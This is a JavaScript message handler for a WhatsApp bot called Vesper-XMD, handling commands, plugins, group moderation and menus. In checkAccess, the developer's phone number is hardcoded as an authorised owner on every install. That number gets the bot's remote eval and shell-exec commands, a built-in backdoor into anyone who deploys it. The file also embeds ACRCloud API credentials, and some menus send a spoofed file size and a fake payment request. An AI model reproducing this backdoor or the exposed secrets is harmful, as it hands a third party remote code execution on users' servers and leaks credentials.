/*
 * Give credits to Kevindev
 Contact me on +256742932677
 Coding sounds lounder 
*/

require('./start/Core/developer');
const fs = require('fs');
const util = require("util");
const moment = require("moment-timezone");
const path = require('path');
const axios = require('axios')
const devKelvin = '256742932677';
const cheerio = require('cheerio')
const os = require('os');
const { performance } = require("perf_hooks");
const acrcloud = require ('acrcloud');
const lolcatjs = require('lolcatjs');
const timezones = global.timezones || "Africa/Kampala";
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  spawn,
  exec, 
  execSync 
} = require('child_process');

const { 
  default: baileys,
  proto, 
  generateWAMessage,
  getDevice,
  generateWAMessageFromContent,
  getContentType, 
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");

const { 
      smsg,
      formatSize,
      isUrl,
      generateMessageTag,
      getBuffer,
      getSizeMedia,
      runtime,
      fetchJson,
      sleep 
    } = require('./start/lib/myfunction');

const db = require('./start/Core/databaseManager');
const GroupDB = require('./start/Metadata/group');

const PluginManager = require('./start/lib/PluginManager');

const { 
    handleAntiDelete,
    handleLinkViolation,
    checkAndHandleLinks,
    handleAntiTag,
    handleAntiTagAdmin,
    handleBadword,
    handleAntisticker,
    handleAntiEdit,
    handleMessageStore 
} = require('./start/kevin');

const { handleAutoReact } = require('./start/kelvinCmds/autoreact');
const { handleAutoRead } = require('./start/kelvinCmds/autoread');
const { handleAutoRecording } = require('./start/kelvinCmds/autorecord');
const { applyFont, setBotNumber } = require('./start/src/font');
const { handleAutoTyping } = require('./start/kelvinCmds/autotyping');
const { handleAIChatbot } = require('./start/kelvinCmds/chatbot');

// Menu Images - KelvinTech Style
let kelvinkid1, kelvinkid2, kelvinkid3, kelvinkid4, kelvinkid5;   
    
    // Load images
    kelvinkid1 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");
    kelvinkid2 = fs.readFileSync("./start/lib/Media/Images/Vesper2.jpg");
    kelvinkid3 = fs.readFileSync("./start/lib/Media/Images/Vesper3.jpg");
    kelvinkid4 = fs.readFileSync("./start/lib/Media/Images/Vesper4.jpg");
    kelvinkid5 = fs.readFileSync("./start/lib/Media/Images/Vesper5.jpg");

//Shazam
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});

const UPTIME_FILE = path.join(__dirname, 'data', 'server_uptime.json');

// Create data folder if it doesn't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

// Get or create server start time
function getServerStartTime() {
    try {
        if (fs.existsSync(UPTIME_FILE)) {
            const data = JSON.parse(fs.readFileSync(UPTIME_FILE, 'utf8'));
            return data.startTime;
        }
    } catch (e) {
        console.log('Creating new uptime file in data folder...');
    }
    
    // Create new uptime file with current time
    const startTime = Date.now();
    fs.writeFileSync(UPTIME_FILE, JSON.stringify({ startTime, createdAt: new Date().toISOString() }));
    return startTime;
}

const SERVER_START_TIME = getServerStartTime();

// Function to get server uptime
function getServerUptime() {
    const uptimeMs = Date.now() - SERVER_START_TIME;
    const uptimeSeconds = Math.floor(uptimeMs / 1000);
    return runtime(uptimeSeconds);
}

// ephoto function 
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
 }

 // Function to save status message
 async function saveStatusMessage(m) {
  try {
    if (!m.quoted || m.quoted.chat !== 'status@broadcast') {
      return reply('*Please reply to a status message!*');
    }
    await m.quoted.copyNForward(m.chat, true);
    kelvin.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    console.log('Status saved successfully!');
  } catch (error) {
    console.error('Failed to save status message:', error);
    reply(`Error: ${error.message}`);
  }
}

// Function to fetch MP3 download URL
async function fetchMp3DownloadUrl(link) {
  
  // XWOLF API (primary)
  const fetchFromXWolf = async (videoUrl) => {
    try {
      // Extract video ID from URL
      let videoId = '';
      const idMatch = videoUrl.match(/(?:v=|\/)([0-9A-Za-z_-]{11})/);
      videoId = idMatch ? idMatch[1] : '';
      
      if (!videoId) {
        throw new Error('Could not extract video ID');
      }
      
      // Try XWolf API
      const wolfUrl = `https://apis.xwolf.space/download/mp3?url=${encodeURIComponent(videoUrl)}`;
      const response = await axios.get(wolfUrl, { timeout: 15000 });
      
      if (response.data && response.data.success) {
        if (response.data.downloadUrl) {
          console.log('✅ XWolf API successful (downloadUrl)');
          return response.data.downloadUrl;
        } else if (response.data.streamUrl) {
          console.log('✅ XWolf API successful (streamUrl)');
          return response.data.streamUrl;
        }
      }
      
      throw new Error('XWolf API returned invalid response');
    } catch (error) {
      console.error('Error with XWolf API:', error.message);
      throw error;
    }
  };
  
  // KEITH API (fallback)
  const fetchFromKeith = async (videoUrl) => {
    try {
      const apiUrl = `https://apiskeith.top/download/audio?url=${encodeURIComponent(videoUrl)}`;
      const response = await axios.get(apiUrl, { timeout: 15000 });
      
      if (response.status !== 200 || !response.data?.status) {
        throw new Error('Failed to fetch from Keith API');
      }
      
      if (response.data.result) {
        console.log('✅ Keith API successful');
        return response.data.result;
      }
      
      throw new Error('Keith API returned invalid response');
    } catch (error) {
      console.error('Error with Keith API:', error.message);
      throw error;
    }
  };
 
  // Try XWolf first, then Keith as fallback
  try {
    console.log('🎵 Trying XWolf API...');
    const downloadUrl = await fetchFromXWolf(link);
    return downloadUrl;
  } catch (xwolfError) {
    console.log('⚠️ XWolf failed, trying Keith API...');
    
    try {
      const keithDownloadUrl = await fetchFromKeith(link);
      return keithDownloadUrl;
    } catch (keithError) {
      console.error('❌ Both APIs failed');
      throw new Error('Unable to download audio. Please try again later.');
    }
  }
}

function generateMenuText(plugins, ownername, prefix, mode, versions, latensie, readmore) {
    const memoryUsage = process.memoryUsage();
    const totalMemory = os.totalmem();
    const systemUsedMemory = totalMemory - os.freemem();

    const progressBar = (used, total, size = 6) => {
        let percentage = Math.round((used / total) * size);
        let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
        return `[${bar}] ${Math.round((used / total) * 100)}%`;
    };

    let totalCommands = 0;
    const uniqueCommands = new Set();
    for (const category in plugins) {
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                uniqueCommands.add(plugin.command[0]);
            }
        });
    }
    totalCommands = uniqueCommands.size;

    let menu = `┌─❖ *VESPER-XMD* ❖─\n`;
menu += `├─• ᴜsᴇʀ: ${ownername}\n`;
menu += `├─• ʙᴏᴛ: ${global.botname || 'Vesper-XMD'}\n`;
menu += `├─• ᴍᴏᴅᴇ: ${mode === 'public' ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}\n`;
menu += `├─• ᴘʟᴀᴛꜰᴏʀᴍ: ${os.platform()}\n`;
menu += `├─• ᴘʀᴇғɪx: [ ${prefix} ]\n`;
menu += `├─• ᴄᴍᴅs: ${totalCommands}+\n`;
menu += `├─• ᴠᴇʀsɪᴏɴ: ${versions}\n`;
menu += `├─• sᴘᴇᴇᴅ: ${latensie.toFixed(4)} ms\n`;
menu += `├─• 𝚁𝙰𝙼: ${progressBar(systemUsedMemory, totalMemory)}\n`;
menu += `└─• ᴅᴇᴠ: ☘ ᴋᴇʟᴠɪɴ  ☘\n`;
menu += `${readmore || ''}\n`;
    
    for (const category in plugins) {
        menu += `┏▦  *${category.toUpperCase()} MENU* ▦\n`;
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                menu += `┃❖ ${plugin.command[0]}\n`;
            }
        });
        menu += `┗▦\n\n`;
    }
    
    return menu;
}

function loadMenuPlugins(directory) {
    const plugins = {};
    
    if (!fs.existsSync(directory)) {
        console.error(`Directory ${directory} does not exist`);
        return plugins;
    }

    const files = fs.readdirSync(directory);
    files.forEach(file => {
        if (file.endsWith('.js')) {
            const filePath = path.join(directory, file);
            try {
                delete require.cache[require.resolve(filePath)];
                const pluginModule = require(filePath);
                
                const pluginArray = Array.isArray(pluginModule) ? pluginModule : [pluginModule];
                const category = path.basename(file, '.js');
                
                if (!plugins[category]) {
                    plugins[category] = [];
                }
                
                plugins[category].push(...pluginArray);
            } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
            }
        }
    });

    return plugins;
}

module.exports = client = async (kelvin, m, chatUpdate, store) => {
  try {
    const body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
      m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
                                         m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
                                         m.text : ""
    );
    
const botNumber = await kelvin.decodeJid(kelvin.user.id);

let prefix = "."; // Default prefix

try {
    prefix = await db.get(botNumber, 'prefix', '.');
} catch (error) {
    console.error('Error loading prefix from database:', error);
    prefix = ".";
}

try {
    const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
    
    if (typeof alwaysonlineSetting === 'boolean') {
        global.alwaysonline = alwaysonlineSetting;
    } else if (typeof alwaysonlineSetting === 'string') {
        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
    } else {
        global.alwaysonline = false;
    }
} catch (error) {
    console.error('Error loading alwaysonline from database:', error);
    global.alwaysonline = false;
}

const isCmd = body && typeof body === 'string' && body.startsWith(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = isCmd && trimmedBody ? trimmedBody.split(/\s+/).shift().toLowerCase() : "";
const args = isCmd ? body.slice(prefix.length).trim().split(/\s+/).slice(1) : [];
const text = args.join(" ");
    
    const sender = m.key.fromMe ? kelvin.user.id.split(":")[0] + "@s.whatsapp.net" || kelvin.user.id : m.key.participant || m.key.remoteJid;
    const senderNumber = sender.split('@')[0];
    const budy = (typeof m.text === 'string' ? m.text : '');
    
    const from = m.key.remoteJid;
    const senderId = m.key.participant || from;
    const isGroup = from.endsWith("@g.us");
    

async function checkAccess(sender) {
    try {
        const normalizedSender = sender.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        
        const sudoUsers = await db.getSudo(botNumber) || [];
        const owners = await db.get(botNumber, 'owners', []);
        
        const authorizedNumbers = [
            botNumber,
            devKelvin,
            ...owners,
            ...sudoUsers
        ]
        .filter(num => num)
        .map(num => {
            if (!num) return null;
            const cleanNum = num.replace(/[^0-9]/g, "");
            return cleanNum ? cleanNum + "@s.whatsapp.net" : null;
        })
        .filter(num => num);
        
        return authorizedNumbers.includes(normalizedSender);
    } catch (error) {
        console.error('Error in checkAccess:', error);
        return false;
    }
}
const Access = await checkAccess(m.sender);

    const pushname = m.pushName || "No Name";
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    const isMedia = /image|video|sticker|audio/.test(mime);

  async function isAdminKelvin(kelvin, chatId, senderId) {
        try {
            const groupMetadata = await kelvin.groupMetadata(chatId);
            
            const botId = kelvin.user.id.split(':')[0] + '@s.whatsapp.net';
            
            const participant = groupMetadata.participants.find(p => 
                p.id === senderId || 
                p.id === senderId.replace('@s.whatsapp.net', '@lid') ||
                p.id === senderId.replace('@lid', '@s.whatsapp.net')
            );
            
            const bot = groupMetadata.participants.find(p => 
                p.id === botId || 
                p.id === botId.replace('@s.whatsapp.net', '@lid')
            );
            
            const isBotAdmin = bot && (bot.admin === 'admin' || bot.admin === 'superadmin');
            const isSenderAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');

            if (!bot) {
                return { isSenderAdmin, isBotAdmin: true };
            }

            return { isSenderAdmin, isBotAdmin };
        } catch (error) {
            console.error('Error in isAdmin:', error);
            return { isSenderAdmin: false, isBotAdmin: false };
        }
}
 
let isSenderAdmin = false;
let isBotAdmin = false;

if (isGroup && m.sender) {
    try {
        const adminResult = await isAdminKelvin(kelvin, from, senderId);
        isSenderAdmin = adminResult.isSenderAdmin;
        isBotAdmin = adminResult.isBotAdmin;
        
    } catch (error) {
        console.error('Error checking admin status:', error);
        isSenderAdmin = false;
        isBotAdmin = false;
    }
}

    let groupMetadata = null
if (isGroup) {
  try {
    groupMetadata = await kelvin.groupMetadata(m.chat)
  } catch (e) {
    console.log("Failed to get group metadata")
  }
}

const groupName = isGroup && groupMetadata ? groupMetadata.subject : ""
const participants = isGroup && groupMetadata ? groupMetadata.participants : []

const groupAdmins = participants
  .filter(p => p.admin)
  .map(p => p.id)

const groupMembers = participants

const groupOwner = groupMetadata?.owner || groupAdmins[0] || null

const isAdmin = isGroup ? groupAdmins.includes(m.sender) : false


if (m.message && !m.message.protocolMessage) {
        handleMessageStore(m);
    }
    
  
    if (m.message?.protocolMessage?.type === 0) {
        console.log('[System] Delete event detected');
        await handleAntiDelete(m, kelvin);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoReact(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRead(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRecording(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoTyping(m, kelvin).catch(console.error);
    }
    
   if (m.message?.protocolMessage?.editedMessage) {
    await handleAntiEdit(m, kelvin);
} 

 if (m.isGroup && body && !m.key.fromMe) {
    await checkAndHandleLinks(kelvin, {
        key: m.key,
        message: m.message
    }, m, botNumber);  
}

if (m.isGroup && m.message && !m.key.fromMe) {
    const mentionedUsers = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentionedUsers.length > 0) {
        await handleAntiTag(kelvin, m, botNumber);  
    }
} 

if (m.isGroup && body) {
    await handleAntiTagAdmin(kelvin, m);
}

 if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
    if (!m.isAdmin && !Access) {
        try {
            
            await kelvin.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            });
            console.log(`✅ Deleted status mention from ${m.sender}`);
        } catch (error) {
            console.log('Failed to delete status mention:', error);
        }
    }
}

if (m.isGroup && !m.key.fromMe && body && body.trim().length > 0) {
    try {
        await GroupDB.addMessage(from, sender); 
    } catch (error) {
        console.error('Error tracking user activity:', error.message);
    }
}

if (m.isGroup && body && !m.key.fromMe) {
    await handleBadword(kelvin, m, botNumber);
}

if (m.isGroup && !m.key.fromMe) {
    await handleAntisticker(kelvin, m, botNumber);
}

if (global.alwaysonline === true || global.alwaysonline === 'true') {
    if (m.message && !m.key.fromMe) {
        try {
            await kelvin.sendPresenceUpdate("available", from);
            await sleep(1000);
        } catch (error) {}
    }
} else {
    if (m.message && !m.key.fromMe) {
        try {
            await kelvin.sendPresenceUpdate("unavailable", from);
            await sleep(1000);
        } catch (error) {}
    }
}
    await handleAIChatbot(m, kelvin, body, from, isGroup, botNumber, isCmd, prefix);
    
    const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
    
    //================== [ CONSOLE LOG] ==================//
    const timezones = "Asia/Makassar"; 
    const dayz = moment(Date.now()).tz(timezones).locale('en').format('dddd');
    const timez = moment(Date.now()).tz(timezones).locale('en').format('HH:mm:ss z');
    const datez = moment(Date.now()).tz(timezones).format("DD/MM/YYYY");

    if (m.message) {
      lolcatjs.fromString(`┏━━━━━━━━━━━━━『  VESPER-XMD  』━━━━━━━━━━━━━─`);
      lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
      lolcatjs.fromString(`»  Date: ${datez}`);
      lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
      lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
      lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
      
      if (isGroup) {
        lolcatjs.fromString(`»  Group: ${groupName || 'N/A'}`);
        lolcatjs.fromString(`»  Group JID: ${m.chat?.split('@')[0] || 'N/A'}`);
      }
      
      lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
      lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
    }
    //<================================================>//
  
// Initialize font system with bot number
(async () => {
    try {
        const botNum = await kelvin.decodeJid(kelvin.user.id);
        setBotNumber(botNum);
    } catch (e) {}
})();

const reply = (text) => m.reply(applyFont(text));
    

const context = {
    kelvin,
    m,
    reply,
    store,
    prefix,
    command,
    args,
    acr,
    text,
    trimmedBody,
    isCmd,
    sender,
    senderNumber,
    pushname,
    Access,
    db,
    GroupDB,
    isCreator: Access,
    isGroup,
    groupName,
    groupMetadata,
    participants,
    isBotAdmin,
    isSenderAdmin,
    quoted,
    saveStatusMessage,
    fetchMp3DownloadUrl,
    mime,
    qmsg,
    isMedia,
    body: budy,
    botNumber,
    from,
    ephoto,
    getServerUptime,
    getServerStartTime,
    sleep,
    fetchJson,
    getBuffer,
    getDevice,
    formatSize,
    timezones,
    isUrl,
    runtime,
    match: command,
    mess: global.mess,
    global: global,
    mentionedJid: m.mentionedJid || [],
    pluginManager: global.pluginManager
};
    
const mode = await db.get(botNumber, 'mode', 'public');

    // Handle commands via plugin system
    if (isCmd && command) {
        const result = await global.pluginManager.executeCommand(context, command);
        
        if (!result.found) {
            switch (command) {
                case 'menu': {
    const startTime = performance.now();
    await m.reply("*Loading menu*...");
    
    // Get menu style from database - this will load from DB every time
    let menuStyle = await db.getMenuStyle(botNumber, '2'); // '2' is default if not set
    menuStyle = String(menuStyle || '2'); // Ensure it's a string
    
    console.log(`📊 Menu style loaded from DB: ${menuStyle}`); // Debug log
    
    const endTime = performance.now();
    const latensie = endTime - startTime;
    
    const ownername = await db.get(botNumber, 'ownername', 'Not set');
    const prefixz = prefix;  
    const modeStatus = mode;
    const versions = `${global.versions || '1.0.0'}`; 
    
    const pluginsDir = path.join(__dirname, 'kelvinPlugins'); 
    const plugins = loadMenuPlugins(pluginsDir);
    
    const menulist = generateMenuText(plugins, ownername, prefixz, modeStatus, versions, latensie, readmore);
    
    const menuImages = [kelvinkid1, kelvinkid2, kelvinkid3, kelvinkid4, kelvinkid5];
    
    // Send menu with selected style
    await sendMenuWithStyle(kelvin, m, menuStyle, menulist, menuImages);
    break;
}
case 'reloadplugins': {
    if (!Access) return reply('Owner only command!');
                    try {
                        const pluginsDir = path.join(__dirname, 'kelvinPlugins');
                        const count = global.pluginManager.reloadPlugins(pluginsDir);
                        reply(`✅ Reloaded ${count} plugins successfully!`);
                    } catch (error) {
                        reply(` Failed to reload plugins: ${error.message}`);
                    }
                    break;
                }
                
                case 'plugins': {
                    if (!Access) return reply('Owner only command!');
                    const plugins = global.pluginManager.getAllPlugins();
                    let pluginList = '*LOADED PLUGINS*\n\n';
                    
                    for (const [category, pluginArray] of Object.entries(plugins)) {
                        pluginList += `*${category.toUpperCase()}*:\n`;
                        pluginArray.forEach(plugin => {
                            pluginList += `• ${plugin.command[0]}`;
                            if (plugin.command.length > 1) {
                                pluginList += ` (${plugin.command.slice(1).join(', ')})`;
                            }
                            pluginList += '\n';
                        });
                        pluginList += '\n';
                    }
                    
                    reply(pluginList);
                    break;
                }
                
                default: {
                    // Handle eval/exec commands (owner only)
                    if (budy.startsWith('>')) {
                        if (!Access) return;
                        try {
                            let evaled = await eval(budy.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            await m.reply(evaled);
                        } catch (err) {
                            m.reply(String(err));
                        }
                    }
                        
                    if (budy.startsWith('<')) {
                        if (!Access) return;
                        let kode = budy.trim().split(/ +/)[0];
                        let teks;
                        try {
                            teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${text}})()`);
                        } catch (e) {
                            teks = e;
                        } finally {
                            await m.reply(util.format(teks));
                        }
                    }

                    if (budy.startsWith('-')) {
                        if (!Access) return;         
                        if (text == "rm -rf *") return m.reply("😹");
                        exec(budy.slice(2), (err, stdout) => {
                            if (err) return m.reply(`${err}`);
                            if (stdout) return m.reply(stdout);
                        });
                    }
                    
               
                }
            }
        } else if (!result.success) {
            // Command found but errored
            reply(`Error executing ${command}: ${result.error}`);
        }
    }
    
  } catch (err) {
    console.log(util.format(err));
  }
};


// Menu style functions 
async function sendMenuWithStyle(kelvin, m, style, menuText, menuImages) {
    const randomImage = menuImages ? menuImages[Math.floor(Math.random() * menuImages.length)] : null;
    
    switch(style) {
        case '1': // Document with thumbnail
            await kelvin.sendMessage(m.chat, {
                document: kelvinkid1 || Buffer.from(' '),
                mimetype: 'image/jpeg',
                fileName: '✦ ᴋᴇʟᴠɪɴ ᴍᴇɴᴜ ✦',
                fileLength: 99999999999,
                pageCount: 9999999,
                caption: menuText,
                contextInfo: {
                    externalAdReply: {
                        title: 'VESPER',
                        body: '✦ ᴋᴇʟᴠɪɴ ᴍᴇɴᴜ ✦',
                        mediaType: 2,
                        thumbnail: randomImage,
                        mediaUrl: 'https://youtu.be/-',
                        sourceUrl: 'https://whatsapp.com/channel/0029Vb0JX0VfXx3R5X5X5X5X'
                    }
                }
            }, { quoted: m });
            break;
            
        case '2': // Simple text reply
            await m.reply(menuText);
            break;
            
        case '3': // Text with external ad reply
            await kelvin.sendMessage(m.chat, {
                text: menuText,
                contextInfo: {
                    externalAdReply: {
                        title: '⚡ VESPER-XMD ⚡',
                        body: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ',
                        thumbnail: randomImage,
                        sourceUrl: 'https://wa.me/256742932677',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
            break;
            
        case '4': // Image with caption
            if (randomImage) {
                await kelvin.sendMessage(m.chat, {
                    image: randomImage,
                    caption: menuText
                }, { quoted: m });
            } else {
                await kelvin.sendMessage(m.chat, {
                    image: { url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png" },
                    caption: menuText
                }, { quoted: m });
            }
            break;
            
        case '5': // Interactive message - Using your specific format
            const interactiveMsg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: null,            
                            },
                            footer: {
                                text: menuText, 
                            },
                            nativeFlowMessage: {
                                buttons: [{
                                    text: null
                                }], 
                            },
                        },
                    },
                },
            }, { quoted: m });
            await kelvin.relayMessage(m.chat, interactiveMsg.message, { messageId: interactiveMsg.key.id });
            break;
            
        case '6': // Payment request format 
            await kelvin.relayMessage(m.chat, {
                requestPaymentMessage: {
                    currencyCodeIso4217: 'USD',
                    requestFrom: '0@s.whatsapp.net',
                    amount1000: '1000',
                    noteMessage: {
                        extendedTextMessage: {
                            text: menuText,
                            contextInfo: {
                                mentionedJid: [m.sender],
                                externalAdReply: {
                                    showAdAttribution: false,
                                },
                            },
                        },
                    },
                },
            }, {});
            break;
            
        default: // Default to style 2
            await m.reply(menuText);
    }
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});